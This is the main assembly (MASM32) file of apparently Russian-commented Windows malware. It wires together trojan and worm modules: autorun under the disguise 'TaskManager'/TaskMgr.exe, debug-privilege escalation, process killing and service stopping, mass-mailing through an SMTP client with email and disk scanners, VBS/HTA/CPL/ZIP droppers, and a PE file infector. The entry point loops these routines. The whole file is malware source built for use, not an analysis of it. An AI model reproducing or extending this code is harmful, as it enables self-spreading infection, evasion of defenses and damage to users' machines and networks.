.586
.model flat, stdcall
include include\windows.inc
include include\kernel32.inc
include include\user32.inc
include include\advapi32.inc
;include include\ws2_32.inc
include include\wsock32.inc
include include\oaidl.inc
;include include\xinch.inc
include include\ole32.inc
include include\shlwapi.inc
include include\oleaut32.inc
include include\shell32.inc
include include\masm32.inc
;include include\rasapi32.inc
include include\gdi32.inc
;include include\oaidl.inc
;include include\aplib.inc
;include include\urlmon.inc
include include\wininet.inc
includelib library\ole32.lib
includelib library\kernel32.lib
includelib library\user32.lib
includelib library\oleaut32.lib
includelib library\advapi32.lib
includelib library\shlwapi.lib
includelib library\shell32.lib
includelib library\masm32.lib
includelib library\wsock32.lib
includelib library\ntdll.lib
;includelib library\ws2_32.lib
;includelib library\rasapi32.lib
includelib library\gdi32.lib
;includelib library\urlmon.lib
;includelib library\aplib.lib
includelib library\wininet.lib

.data


;Настройки
szfilename       db      "\temp.exe",0
szAutoName       db    "TaskManager",0
exename       		db  	"\TaskMgr.exe",0




	lpRecvBufLen    equ 100h        
szSeDebug               db      "SeDebugPrivilege",0
                
       szImgEncoder  		db      "image/jpeg",0
	sz127001		db 	"127.0.0.1",0
	sztemp		db 	".jpg",0
	szICQ99bSearch  	db      "\*.dat",0
	szNilStr		db	0
     	szTrimC      		db  	'" ', 0
        szFmt           	db  	"db %03Xh",13,10,0

	szTextOpen		db	"open",0
	szMUIPath		db	"SOFTWARE\Microsoft\Windows\ShellNoRoam\MUICache",0
        szModuleHeaderStart     db      "p)R#"
		
	szKernel		db	"kernel32.dll",0
				db	"ExpandEnvironmentStringsA",0
				db	"GetDiskFreeSpaceExA",0,0
	dwExpandEnvironmentStrings dd	0
	dwGetDiskFreeSpaceEx	dd	0
				
				
	szSHFolder		db	"shfolder.dll",0
				db	"SHGetFolderPathA",0,0
		
       	szPsApi			db	"psapi.dll",0
				db	"GetModuleFileNameExA",0
				db	"EnumProcesses",0
				db	"EnumProcessModules",0,0


				
        dwGetModuleFileNameEx	dd	0
        dwEnumProcesses		dd	0
        dwEnumProcessModules	dd	0
        			
       	dwSHGetFolderPath	dd	0
       	dwPrevModuleOffset	dd	0
 b64Attach               dd      0
   	b64AttachLen            dd      0
	bsize			dd	1024
	    Crypt1  equ 01eh
        Crypt2  equ 01dh
.data?
	tkp TOKEN_PRIVILEGES <> 
	hToken dd ? 
	hKey   dd ?
	MAX_ASCII EQU 	5000
	MAX_B64   EQU 	MAX_ASCII * 3 / 2
        GlobalBuffer    dd      ?
	buffer1   db 	MAX_B64 dup (?)
	buffer2   db 	MAX_ASCII dup (?)
        lpFun   db      1024 dup(?)
        ;lpBuf   db      1024 dup(?)
        lpArgs  dd      ?
        lpStr1  db      1024 dup(?)
	FHndl   dd	?
	cmd 	dd 	?
	sf	dd 	?
        lpWSAData               WSADATA <>
        lpOutStream             dd      ?
        lpBuf1          db      32768 dup(?)
        lpBuf2          db      32768 dup(?)
        lpBuf3          db      32768 dup(?)
        lpBuf4          db      32768 dup(?)
        IPbuff      	db 	24 dup (?)

.const 


		
CSIDL_COMMON_APPDATA equ 0023h
CSIDL_PROFILE equ 0028h

include options.inc

	MyClearStr PROTO :DWORD,:DWORD
	start_work proto
	Sender proto :DWORD
	
szText MACRO Name, Text:VARARG
   LOCAL lbl
    jmp lbl
   Name db Text,0
   lbl:
ENDM

SendSvcState macro state
	mov	stSS.dwCurrentState,state
	invoke	SetServiceStatus,hStatus,addr stSS
endm

 mNextListEntry MACRO ML
          cld
          xor     eax, eax
          or      ecx, -1
          repnz scasb
          cmp     byte ptr[edi], 0
          jnz     ML
        ENDM

m2m macro dst: REQ, src: REQ
        push src
        pop  dst
endm

_IOR macro x: REQ, y: REQ, t: REQ
  	exitm <(IOC_OUT or ((sizeof(t) and IOCPARM_MASK) shl 16) or (x shl 8) or y)>
endm

@AllocStr macro szName: REQ, szData: REQ
        .data
                szName          db      szData,0
                &szName&Len     equ     @CatStr(%@SizeStr(szData)-2)
endm

@AllocMem macro szName: REQ, dwSize: REQ
        .data?
                szName          db      dwSize dup(?)
endm

@MAKEWORD macro Hi, Lo
        exitm   <(Hi shl 8) or Lo> 
endm

@Next macro EntryLoop: REQ
	cld
	xor     eax, eax
	m2m	ecx, -1
	repnz scasb
	cmp     byte ptr[edi], al
	jnz     EntryLoop
endm

comethodQProto5 typedef proto :DWORD, :DWORD, :QWORD, :DWORD, :DWORD
comethodQ5      typedef ptr comethodQProto5

comethodQProto4 typedef proto :DWORD, :QWORD, :DWORD, :DWORD
comethodQ4      typedef ptr comethodQProto4

comethodQProto2 typedef proto :DWORD, :QWORD
comethodQ2      typedef ptr comethodQProto2

S_BEGIN       equ     0
S_CUR         equ     1
S_END         equ     2

IStream struct DWORD
	IStream_QueryInterface  comethod3       ?
	IStream_AddRef          comethod1       ?
	IStream_Release         comethod1       ?
	IStream_Read            comethod4       ?
	IStream_Write           comethod4       ?
	IStream_Seek            comethodQ4      ?
	IStream_SetSize         comethodQ2      ?
	IStream_CopyTo          comethodQ5      ?
	IStream_Commit          comethod2       ?
	IStream_Revert          comethod1       ?
	IStream_LockRegion      comethod4       ?
	IStream_UnlockRegion    comethod4       ?
	IStream_Stat            comethod3       ?
	IStream_Clone           comethod2       ?
IStream ends

.code

 include seh.asm


	


 	
  ;Установочные функции
	IFDEF X_RUNNORMAL
		include autorun\runnormal.asm
	ENDIF

	IFDEF X_ATTACH
		include functions\Attach.asm
	ENDIF

	
	
	IFDEF X_KILLPROC
		include killer\killproc.asm
	ENDIF


	
	
	

	IFDEF X_SVCSTOP
		include killer\stopService.asm
	ENDIF
	
	
	
include functions\UnderFW.asm

	
	



include functions\main.asm
include worm\stream.asm

	

	
	IFDEF X_HYWK
 	  include else\HYWK.asm
	ENDIF






IFDEF X_WORM
          include worm\Utils.asm
          include worm\PassGen.asm
          include worm\HashTable.asm
          include worm\CPLStub.inc
          include worm\CPL.asm
          include worm\VBS.asm
          include worm\HTA.asm
          include worm\ZIP.asm
          include worm\Network.asm
          include worm\DNS.asm
          include worm\SMTPClient.asm
          include worm\SMTPThread.asm
      	  include worm\StartUp.asm
          include worm\EmailScanner.asm
          include worm\HDDScanner.asm
          include worm\SMTPMessage.asm

IFDEF X_INFECT
          include worm\PVG.asm
          include worm\PEInfector.asm
ENDIF




startworm proc
 	 invoke  CoInitialize, 0
         invoke  WSAStartup, 0101h, addr lpWSAData ; useless shit

         invoke  EmailScanInit
         invoke  InitSMTPQueue

         invoke  EncodeSelf

         invoke  HDDScanDrives
	 ret
startworm endp



ENDIF



	
	





	



        
		
start:


	

	IFDEF X_RUNNORMAL
invoke  RunTrojLayer
	ENDIF


 IFDEF X_HYWK
		invoke  ProcessStartup
	ELSE
		invoke  Privilegii
	ENDIF

IFDEF  X_ATTACH
		invoke	AttachLayer
	ENDIF


  @hey:




 

	IFDEF X_SVCSTOP
		invoke StopServices
	ENDIF


	IFDEF X_KILLPROC
		invoke CreateThread, NULL, 0, addr KillProcsThread, NULL, 0, addr lpBuf1
		invoke KillProcs
	ENDIF

invoke startworm	
	

invoke Sleep, 2000


push offset @hey

end start
